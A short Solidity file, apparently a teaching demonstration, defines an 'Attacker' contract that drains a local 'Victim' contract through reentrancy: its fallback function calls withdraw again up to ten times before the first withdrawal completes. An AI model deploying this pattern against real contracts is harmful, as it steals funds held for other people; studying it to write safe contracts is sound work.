pragma solidity ^0.6.0;

import "./Victim.sol";

contract Attacker {
   uint times;
   Victim victim;
   
   constructor(address victimAddress) public {
       victim = Victim(victimAddress);
   }
   
   function initiate() external {
       times = 0;
       victim.withdraw(1 ether);
   }
   
   fallback() external payable {
       if(times < 10) {
           times++;
           victim.withdraw(1 ether);
       }
   } 
}
